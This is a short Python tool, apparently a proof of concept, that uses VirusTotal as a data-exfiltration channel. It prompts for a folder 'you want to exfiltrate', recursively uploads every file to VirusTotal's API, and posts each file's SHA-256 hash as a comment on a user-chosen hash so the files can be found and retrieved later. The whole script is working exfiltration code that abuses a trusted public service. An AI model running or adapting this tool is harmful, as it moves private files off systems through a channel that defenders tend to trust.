import os
import requests
import hashlib
import json
import argparse
import pyfiglet


result = pyfiglet.figlet_format("VT Not so pretty by YanivG")
print(result) 

# Argument Parser for folder input
parser = argparse.ArgumentParser(description="VT not so pretty by YanivG")
parser.add_argument('-f', '--folder', type=str, help="Path to the folder you want to exfiltrate")

args = parser.parse_args()

# Function to validate if a folder path exists
def validate_folder_path(folder_path):
    return os.path.isdir(folder_path)

# Use specified folder or prompt for user input
folder_path = args.folder if args.folder else input("Please enter the folder path you want to exfiltrate: ")

# Validate folder path
while not validate_folder_path(folder_path):
    print("Invalid folder path. Please enter a valid folder path.")
    folder_path = input("Please enter the folder path you want to exfiltrate: ")

# VirusTotal API URL 
url = "https://www.virustotal.com/api/v3/files"

# Get API key from user
api_key = input("Enter your VirusTotal API key: ") 

headers = {
    "x-apikey": api_key
}

# Hardcoded file hash to comment on
comments_file_hash = input("Please enter the hash to comment on: ")

# Recursive function to upload files from the directory and its subdirectories
def upload_files_recursively(directory_path):
    for root, dirs, files in os.walk(directory_path):
        for filename in files:
            file_path = os.path.join(root, filename)

            with open(file_path, "rb") as file:
                file_byte = file.read()  # Read the file content
                hash_sha256 = hashlib.sha256()
                hash_sha256.update(file_byte)
                file_hash = hash_sha256.hexdigest()  # Compute the SHA-256 hash

                # Upload the file to VirusTotal
                files = {"file": (filename, file_byte)}
                response = requests.post(url, files=files, headers=headers)
                print(f"File: {filename}, SHA-256 Hash: {file_hash}")
                print(f"VirusTotal Response: {response.status_code} - {response.text}")

                # Post a comment to the file using the hash provided by the user
                comment_url = f"https://www.virustotal.com/api/v3/files/{comments_file_hash}/comments"
                comment_body = json.dumps({
                    "data": {
                        "type": "comment",
                        "attributes": {
                            "text": file_hash
                        }
                    }
                })

                comment_response = requests.post(comment_url, headers=headers, data=comment_body)
                print(f"Comment Response: {comment_response.status_code} - {comment_response.text}")

# Start uploading files recursively from the specified folder
upload_files_recursively(folder_path)

print("Done")
